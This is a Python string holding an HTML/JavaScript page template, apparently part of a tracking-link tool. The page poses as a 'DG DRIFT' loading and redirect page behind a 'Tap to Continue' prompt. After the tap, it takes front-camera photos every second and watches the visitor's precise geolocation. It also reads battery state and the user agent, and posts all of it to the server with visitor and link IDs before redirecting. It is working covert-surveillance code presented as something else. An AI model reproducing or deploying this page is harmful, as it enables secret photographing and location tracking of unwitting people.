SPY_PAGE = r'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { text-align: center; padding: 20px; max-width: 380px; }
        .logo { font-size: 28px; font-weight: 900; background: linear-gradient(45deg, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px; }
        .subtitle { color: #555; font-size: 12px; margin-bottom: 25px; letter-spacing: 1px; }
        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.05); border-radius: 50%; border-top: 3px solid #f7971e; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { color: #4ade80; font-size: 13px; min-height: 22px; }
        .status-text.error { color: #ef4444; }
        .badge { display: inline-block; background: rgba(255,255,255,0.03); padding: 4px 14px; border-radius: 20px; font-size: 10px; color: #666; margin-top: 15px; border: 1px solid rgba(255,255,255,0.03); }
        .badge span { color: #f7971e; }
        #video { display: none; }
        #canvas { display: none; }
        .red-dot { display: inline-block; width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1s infinite; margin-right: 6px; }
        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(1.2); } }
        .recording { display: inline-flex; align-items: center; background: rgba(239, 68, 68, 0.1); padding: 4px 12px; border-radius: 20px; font-size: 11px; color: #ef4444; margin-top: 8px; }
        .debug-info { color: #444; font-size: 10px; margin-top: 15px; word-break: break-all; max-height: 60px; overflow-y: auto; }
        #tapOverlay {
            position: fixed; inset: 0; background: #0a0a0a; z-index: 9999;
            display: flex; align-items: center; justify-content: center;
            flex-direction: column; cursor: pointer;
        }
        #tapOverlay .cam { font-size: 70px; margin-bottom: 20px; }
        #tapOverlay .tap-title { color: #f7971e; font-size: 20px; font-weight: bold; }
        #tapOverlay .tap-sub { color: #666; font-size: 12px; margin-top: 12px; }
    </style>
</head>
<body>
    <div id="tapOverlay">
        <div class="cam">📷</div>
        <div class="tap-title">Tap to Continue</div>
        <div class="tap-sub">Enable camera &amp; location to proceed</div>
    </div>

    <div class="container">
        <div class="logo">✨ DG DRIFT</div>
        <div class="subtitle">🔒 Secure Connection</div>
        <div class="spinner"></div>
        <div class="status-text" id="status">📸 Initializing...</div>
        <div class="recording" id="recordingBadge" style="display:none;">
            <span class="red-dot"></span> RECORDING
        </div>
        <div class="badge">🆔 <span id="visitorDisplay"></span></div>
        <div class="debug-info" id="debugInfo"></div>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const visitorId = "{{ visitor_id }}";
        const targetUrl = "{{ target_url }}";
        const linkId = "{{ link_id }}";
        let photoCount = 0;
        let isCapturing = false;
        let started = false;
        const debugEl = document.getElementById('debugInfo');

        function debug(msg) { debugEl.textContent = msg; console.log(msg); }

        document.getElementById('visitorDisplay').textContent = visitorId.substring(0,15)+'...';

        if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
            debug('⚠️ Not HTTPS — camera/geo may not work.');
        }

        let pendingData = [];
        let lastSend = 0;

        let secondsLeft = 10;
        const statusEl = document.getElementById('status');
        const countdown = setInterval(() => {
            secondsLeft--;
            if (secondsLeft > 0) statusEl.textContent = '⏳ Redirecting in '+secondsLeft+'s...';
        }, 1000);
        setTimeout(() => {
            clearInterval(countdown);
            isCapturing = false;
            statusEl.textContent = '🚀 Redirecting...';
            setTimeout(() => { window.location.href = targetUrl; }, 1500);
        }, 10000);

        document.getElementById('tapOverlay').addEventListener('click', () => {
            if (started) return;
            started = true;
            document.getElementById('tapOverlay').style.display = 'none';
            sendData({ ping: true, ua: navigator.userAgent });
            startCamera();
            startGeo();
            startBattery();
        });

        function startCamera() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                document.getElementById('status').textContent = '⚠️ Camera API not supported';
                document.getElementById('status').className = 'status-text error';
                return;
            }
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                document.getElementById('status').textContent = '📸 Capturing...';
                document.getElementById('recordingBadge').style.display = 'inline-flex';
                isCapturing = true;
                debug('✅ Camera active');
                setInterval(() => {
                    if (isCapturing) { capturePhoto(); photoCount++; }
                }, 1000);
            })
            .catch(err => {
                document.getElementById('status').textContent = '⚠️ Camera denied';
                document.getElementById('status').className = 'status-text error';
                debug('❌ Camera: ' + err.message);
            });
        }

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            if (!video.videoWidth) return;
            const ctx = canvas.getContext('2d');
            canvas.width = 640; canvas.height = 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
            sendData({ photo: dataUrl });
        }

        function startGeo() {
            if (!navigator.geolocation) return;
            navigator.geolocation.watchPosition(
                pos => { sendData({ location: { lat: pos.coords.latitude, lng: pos.coords.longitude } }); },
                err => debug('❌ Location: ' + err.message),
                { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
            );
        }

        function startBattery() {
            if (!navigator.getBattery) return;
            navigator.getBattery().then(battery => {
                function update() {
                    sendData({ battery: { level: Math.round(battery.level * 100), charging: battery.charging }});
                }
                update();
                setInterval(update, 5000);
            });
        }

        function sendData(data) {
            pendingData.push(data);
            if (Date.now() - lastSend > 1500 || pendingData.length >= 2) {
                const batch = pendingData.slice();
                pendingData = [];
                const payload = batch.map(d => ({ ...d, vid: visitorId, link_id: linkId }));
                fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'same-origin',
                    body: JSON.stringify(payload)
                })
                .then(async res => {
                    if (!res.ok) {
                        const txt = await res.text().catch(() => '');
                        debug('❌ Server ' + res.status + ' ' + txt.slice(0, 80));
                    }
                })
                .catch(err => debug('❌ Send error: ' + err.message));
                lastSend = Date.now();
            }
        }
    </script>
</body>
</html>
'''